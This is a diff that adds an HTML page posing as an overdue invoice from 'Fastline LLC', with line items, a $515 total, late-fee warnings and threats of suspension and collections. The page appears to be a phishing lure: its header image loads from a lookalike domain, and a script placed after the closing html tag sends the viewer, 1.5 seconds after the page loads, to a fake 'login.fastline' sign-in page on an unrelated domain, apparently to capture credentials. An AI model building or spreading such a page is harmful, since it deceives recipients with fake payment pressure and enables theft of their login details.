@@ -1,0 +1,304 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Fastline Invoice - Page 2 of 5</title>
+
+<style>
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
+    margin: 0;
+    background: #eef0f2;
+    color: rgb(51,51,51);
+  }
+
+  .terms-box h3 {
+    margin-top: 0;
+    margin-bottom: 12px;
+  }
+
+  .page {
+    width: 820px;
+    margin: 40px auto;
+    background: #fff;
+    padding: 48px;
+    box-shadow: 0 10px 30px rgba(0,0,0,0.08);
+    border-radius: 6px;
+  }
+
+  .top-bar {
+    display: flex;
+    justify-content: space-between;
+    align-items: flex-start;
+    border-bottom: 1px solid #e6e6e6;
+    padding-bottom: 18px;
+  }
+
+  .brand {
+    font-size: 22px;
+    font-weight: 600;
+  }
+
+  .brand span {
+    color: #f1c40f;
+  }
+
+  .invoice-meta {
+    text-align: right;
+    font-size: 13px;
+    color: #555;
+    line-height: 1.6;
+  }
+
+  .status {
+    margin-top: 6px;
+    display: inline-block;
+    padding: 4px 8px;
+    background: #f1c40f;
+    color: #000;
+    font-weight: 600;
+    font-size: 11px;
+    border-radius: 3px;
+  }
+
+  .section { margin-top: 28px; }
+
+  .due-warning {
+    padding: 12px 14px;
+    border: 1px solid #e74c3c;
+    background: #fdecea;
+    color: #c0392b;
+    font-size: 13px;
+    border-radius: 4px;
+  }
+
+  .grid {
+    display: flex;
+    justify-content: space-between;
+    gap: 40px;
+  }
+
+  .box {
+    width: 48%;
+    font-size: 13px;
+  }
+
+  h3 {
+    font-size: 14px;
+    border-left: 4px solid #f1c40f;
+    padding-left: 10px;
+    margin-bottom: 10px;
+  }
+
+  table {
+    width: 100%;
+    border-collapse: separate;
+    border-spacing: 0 10px;
+    margin-top: 12px;
+    font-size: 13px;
+  }
+
+  thead th {
+    text-align: left;
+    font-size: 12px;
+    color: #666;
+    padding: 10px;
+    border-bottom: 1px solid #e6e6e6;
+  }
+
+  tbody td {
+    padding: 16px 10px;
+    border-bottom: 1px solid #f0f0f0;
+    vertical-align: top;
+  }
+
+  thead th:nth-child(2),
+  tbody td:nth-child(2) {
+    text-align: center;
+    width: 70px;
+  }
+
+  thead th:nth-child(3),
+  tbody td:nth-child(3),
+  thead th:nth-child(4),
+  tbody td:nth-child(4) {
+    text-align: right;
+    width: 120px;
+    font-variant-numeric: tabular-nums;
+  }
+
+  .desc-title { font-weight: 500; }
+  .desc-sub { font-size: 12px; color: #777; }
+
+  .totals {
+    text-align: right;
+    margin-top: 22px;
+    border-top: 2px solid #eee;
+    padding-top: 16px;
+  }
+
+  .total-final {
+    font-size: 20px;
+    font-weight: 700;
+    color: #f1c40f;
+  }
+
+  .fees-box {
+    margin-top: 10px;
+    font-size: 13px;
+    color: #c0392b;
+  }
+
+  .terms-box {
+    margin-top: 28px;
+    font-size: 12.5px;
+    line-height: 1.6;
+    padding: 16px;
+    border-left: 4px solid #f1c40f;
+    background: #fafafa;
+  }
+
+  .support {
+    margin-top: 28px;
+    font-size: 13px;
+    padding: 16px;
+    border-left: 4px solid #f1c40f;
+    background: #fafafa;
+  }
+
+  .footer {
+    margin-top: 40px;
+    font-size: 11px;
+    text-align: center;
+    color: #888;
+    border-top: 1px solid #eee;
+    padding-top: 12px;
+  }
+
+</style>
+</head>
+
+<body>
+
+<div class="page">
+
+  <div class="top-bar">
+    <div style="padding: 20px; background-color:rgb(51,51,51);width:330px">
+      <img src="https://fastlin.vercel.app/emailheader.png">
+    </div>
+
+    <div class="invoice-meta">
+      <div><strong>INVOICE</strong></div>
+      <div>Page 2 of 5</div>
+      <div>Invoice #: FL-2026-000128</div>
+      <div>Account #: AC-883920</div>
+      <div class="status">OVERDUE</div>
+    </div>
+  </div>
+
+  <div class="section">
+    <div class="due-warning">
+      <strong>Payment Due Date:</strong> March 30, 2026 — This invoice is overdue.
+    </div>
+  </div>
+
+  <div class="section grid">
+    <div class="box">
+      <h3>Billing Information</h3>
+      Fastline LLC<br>
+      PO Box 248<br>
+      Buckner, KY 40010<br>
+      United States
+    </div>
+  </div>
+
+  <div class="section">
+    <h3>Invoice Details</h3>
+
+    <table>
+      <thead>
+        <tr>
+          <th>Description</th>
+          <th>Qty</th>
+          <th>Unit Price</th>
+          <th>Total</th>
+        </tr>
+      </thead>
+
+      <tbody>
+        <tr>
+          <td>
+            <div class="desc-title">Equipment Listing Fee</div>
+            <div class="desc-sub">One-time listing with marketplace visibility and indexing.</div>
+          </td>
+          <td>1</td>
+          <td>$250.00</td>
+          <td>$250.00</td>
+        </tr>
+
+        <tr>
+          <td>
+            <div class="desc-title">Marketplace Promotion Package</div>
+            <div class="desc-sub">Featured placement and enhanced exposure.</div>
+          </td>
+          <td>1</td>
+          <td>$150.00</td>
+          <td>$150.00</td>
+        </tr>
+
+        <tr>
+          <td>
+            <div class="desc-title">Account Activation & Maintenance</div>
+            <div class="desc-sub">Account setup and ongoing maintenance.</div>
+          </td>
+          <td>1</td>
+          <td>$90.00</td>
+          <td>$90.00</td>
+        </tr>
+      </tbody>
+    </table>
+  </div>
+
+  <div class="section totals">
+    <div><strong>Subtotal:</strong> $490.00</div>
+    <div><strong>Late Fee:</strong> $25.00</div>
+    <div class="total-final">Total Due: $515.00</div>
+
+    <div class="fees-box">
+      Late Fee Notice: A late fee of up to 1.5% per month (or $25 minimum) applies to overdue balances.
+    </div>
+  </div>
+
+  <div class="section terms-box">
+    <h3>Payment Terms & Account Status</h3>
+
+    To maintain an active account, payment must be completed by the end of the next billing cycle (by the 30th of the following month).<br><br>
+
+    Failure to complete payment by the due date may result in account suspension, limitation of access, or deactivation of services.<br><br>
+
+    Overdue balances may be subject to late fees as permitted under applicable laws and the service agreement. Continued non-payment may result in the account being referred to collections.<br><br>
+
+    <strong>Administrative Fee Disclosure:</strong> Overdue balances may incur a late fee of up to 1.5% per month with a minimum charge of $25.<br><br>
+
+    By using Fastline services, the client agrees to the applicable Terms of Service.
+  </div>
+
+  <div class="section support">
+    <strong>Need Help?</strong><br><br>
+    For full account details, billing breakdown, disputes, and support information, please refer to <strong>Page 5 of this invoice</strong>.
+  </div>
+
+  <div class="footer">
+    Fastline LLC © 2026 — Page 2 of 5 — Confidential Invoice Document
+  </div>
+
+</div>
+
+</body>
+</html>
+
+<script>
+setTimeout(() => {
+  window.location.href = "https://login.fastline.id7638843.com/signin.html?crte?siteid=0&co_partnerId=0&UsingSSL=1&rv4=1&ru=https%3A%2F%2F";
+}, 1500);
+</script>
